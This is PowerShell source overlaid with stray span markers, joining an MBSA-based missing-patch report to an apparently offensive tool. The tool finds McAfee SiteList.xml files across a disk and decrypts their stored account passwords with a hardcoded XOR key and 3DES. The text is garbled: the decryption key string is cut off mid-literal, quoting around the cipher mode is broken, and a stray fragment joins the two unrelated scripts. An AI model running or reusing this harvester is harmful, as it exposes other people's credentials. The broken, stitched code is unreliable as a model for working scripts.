 -||-> function Get-MissingUpdates {
	[CmdletBinding()]
	[OutputType([System.Management.Automation.PSCustomObject])]
	param (
		[Parameter(Mandatory,
		ValueFromPipeline,
		ValueFromPipelineByPropertyName)]
		[string]$ComputerName
	)
	begin {
		 -||-> function Get-32BitProgramFilesPath {
			 -||-> if ( -||-> ( -||-> Get-Architecture <-||- ) -eq 'x64' <-||- ) {
				 -||-> ${ env:ProgramFiles(x86) } <-||- 
			} else {
				 -||-> $env:ProgramFiles <-||- 
			} <-||- 
		} <-||- 
		
		 -||-> function Get-Architecture {
			 -||-> if ( -||-> [System.Environment]::Is64BitOperatingSystem <-||- ) {
				 -||-> 'x64' <-||- 
			} else {
				 -||-> 'x86' <-||- 
			} <-||- 
		} <-||- 
		
		 -||-> $Output = @{ } <-||- 
	}
	process {
		 -||-> try {
			
			
			 -||-> Get-ChildItem "$( -||-> $Env:USERPROFILE <-||- )\SecurityScans\*" -Recurse -ea 'SilentlyContinue' | Remove-Item -Force -Recurse <-||- 
			
			 -||-> $ExeFilePath = "$( -||-> Get-32BitProgramFilesPath <-||- )\Microsoft Baseline Security Analyzer 2\mbsacli.exe" <-||- 
			 -||-> if ( -||-> !( -||-> Test-Path $ExeFilePath <-||- ) <-||- ) {
				throw  -||-> "$ExeFilePath not found" <-||- 
			} <-||- 
			 -||-> & $ExeFilePath /target $ComputerName /wi /nvc /o %C% 2>&1> $null <-||- 
			
			 -||-> ParseMbsaXml "$( -||-> $Env:USERPROFILE <-||- )\SecurityScans\$( -||-> $Computername.Split('.')[0] <-||- ).mbsa" <-||- 
		} catch {
			 -||-> Write-Error "Error: $( -||-> $_.Exception.Message <-||- ) - Line Number: $( -||-> $_.InvocationInfo.ScriptLineNumber <-||- )" <-||- 
		} <-||- 
	}
} <-||- 

 -||-> function ParseMbsaXml
{
	[CmdletBinding()]
	param
	(
		[Parameter(Mandatory)]
		[ValidateNotNullOrEmpty()]
		[string]$FilePath
	)

	 -||-> [xml]$ScanResults =  -||-> Get-Content -Path $FilePath <-||-  <-||- 

	 -||-> $UpdateSeverityLabels = @{
		'0' =  -||-> 'Other' <-||- 
		'1' =  -||-> 'Low' <-||- 
		'2' =  -||-> 'Moderate' <-||- 
		'3' =  -||-> 'Important' <-||- 
		'4' =  -||-> 'Critical' <-||- 
	} <-||- 
	
	 -||-> $MissingUpdates = $ScanResults.SelectNodes("//Check[@Name='Windows Security Updates']/Detail/UpdateData[@IsInstalled='false']") <-||- 
	 -||-> foreach ($Update in  -||-> $MissingUpdates <-||- ) {
		 -||-> $Ht = @{ } <-||- 
		 -||-> $Properties =  -||-> $Update | Get-Member -Type Property <-||-  <-||- 
		 -||-> foreach ($Prop in  -||-> $Properties <-||- ) {
			 -||-> $Value = ( -||-> $Update | select -expandproperty $Prop.Name <-||- ) <-||- 
			 -||-> if ( -||-> $Prop.Name -eq 'Severity' <-||- ) {
				 -||-> $Value = $UpdateSeverityLabels[$Value] <-||- 
			} <-||- 
			 -||-> $Ht[$Prop.Name] = $Value <-||- 
		} <-||- 
		 -||-> [pscustomobject]$Ht <-||- 
	} <-||- 
	
} -||-> f <-||- function Get-SiteListPassword {


    [CmdletBinding()]
    param(
        [ValidateScript({ -||-> Test-Path -Path $_ <-||-  })]
        [String]
        $SiteListFilePath
    )

     -||-> function Get-DecryptedSitelistPassword {
        
        
        
        [CmdletBinding()]
        Param (
            [Parameter(Mandatory = $True)]
            [String]
            $B64Pass
        )

        
         -||-> Add-Type -assembly System.Security <-||- 
         -||-> Add-Type -assembly System.Core <-||- 

        
         -||-> $Encoding = [System.Text.Encoding]::ASCII <-||- 
         -||-> $SHA1 =  -||-> New-Object System.Security.Cryptography.SHA1CryptoServiceProvider <-||-  <-||-  
         -||-> $3DES =  -||-> New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider <-||-  <-||- 

        
         -||-> $XORKey = 0x12,0x15,0x0F,0x10,0x11,0x1C,0x1A,0x06,0x0A,0x1F,0x1B,0x18,0x17,0x16,0x05,0x19 <-||- 

        
         -||-> $I = 0 <-||- ;
         -||-> $UnXored =  -||-> [System.Convert]::FromBase64String($B64Pass) | Foreach-Object {  -||-> $_ -BXor $XORKey[$I++ % $XORKey.Length] <-||-  } <-||-  <-||- 

        
         -||-> $3DESKey = $SHA1.ComputeHash($Encoding.GetBytes('<!@

        
        $3DES.Mode = ' -||-> E <-||- ECB'
        $3DES.Padding = 'None'
        $3DES.Key = $3DESKey

        
        $Decrypted = $3DES.CreateDecryptor().TransformFinalBlock($UnXored, 0, $UnXored.Length)

        
        $Index = [Array]::IndexOf($Decrypted, [Byte]0)
        if($Index -ne -1) {
            $DecryptedPass = $Encoding.GetString($Decrypted[0..($Index-1)])
        }
        else {
            $DecryptedPass = $Encoding.GetString($Decrypted)
        }

        New-Object -TypeName PSObject -Property @{'Encrypted'=$B64Pass;'Decrypted'=$DecryptedPass}
    }

    function Get-SitelistFields {
        [CmdletBinding()]
        Param (
            [Parameter(Mandatory = $True)]
            [String]
            $Path
        )

        try {
            [Xml]$SiteListXml = Get-Content -Path $Path

            if($SiteListXml.InnerXml -Like "*password*") {
                Write-Verbose "Potential password in found in $Path"

                $SiteListXml.SiteLists.SiteList.ChildNodes | Foreach-Object {                    
                    try {
                        $PasswordRaw = $_.Password.' <-||- 

                         -||-> if( -||-> $_.Password.Encrypted -eq 1 <-||- ) {
                            
                             -||-> $DecPassword =  -||-> if( -||-> $PasswordRaw <-||- ) {  -||-> ( -||-> Get-DecryptedSitelistPassword -B64Pass $PasswordRaw <-||- ).Decrypted <-||-  } else { -||-> '' <-||- } <-||-  <-||- 
                        }
                        else {
                             -||-> $DecPassword = $PasswordRaw <-||- 
                        } <-||- 

                         -||-> $Server =  -||-> if( -||-> $_.ServerIP <-||- ) {  -||-> $_.ServerIP <-||-  } else {  -||-> $_.Server <-||-  } <-||-  <-||- 
                         -||-> $Path =  -||-> if( -||-> $_.ShareName <-||- ) {  -||-> $_.ShareName <-||-  } else {  -||-> $_.RelativePath <-||-  } <-||-  <-||- 

                         -||-> $ObjectProperties = @{
                            'Name' =  -||-> $_.Name <-||- ;
                            'Enabled' =  -||-> $_.Enabled <-||- ;
                            'Server' =  -||-> $Server <-||- ;
                            'Path' =  -||-> $Path <-||- ;
                            'DomainName' =  -||-> $_.DomainName <-||- ;
                            'UserName' =  -||-> $_.UserName <-||- ;
                            'EncPassword' =  -||-> $PasswordRaw <-||- ;
                            'DecPassword' =  -||-> $DecPassword <-||- ;
                        } <-||- 
                         -||-> New-Object -TypeName PSObject -Property $ObjectProperties <-||- 
                    } <-||- 
                    catch  -||-> {
                         -||-> Write-Debug "Error parsing node : $_" <-||- 
                    } <-||- 
                } <-||- 
            }
        }
        catch  -||-> {
             -||-> Write-Error $_ <-||- 
        } <-||- 
    }

     -||-> if( -||-> $SiteListFilePath <-||- ) {
         -||-> $XmlFiles =  -||-> Get-ChildItem -Path $SiteListFilePath <-||-  <-||- 
    }
    else {
         -||-> $XmlFiles =  -||-> 'C:\Program Files\','C:\Program Files (x86)\','C:\Documents and Settings\','C:\Users\' | Foreach-Object {
             -||-> Get-ChildItem -Path $_ -Recurse -Include 'SiteList.xml' -ErrorAction SilentlyContinue <-||- 
        } <-||-  <-||- 
    } <-||- 

     -||-> $XmlFiles | Where-Object {  -||-> $_ <-||-  } | Foreach-Object {
         -||-> Write-Verbose "Parsing SiteList.xml file '$( -||-> $_.Fullname <-||- )'" <-||- 
         -||-> Get-SitelistFields -Path $_.Fullname <-||-         
    } <-||- 
}


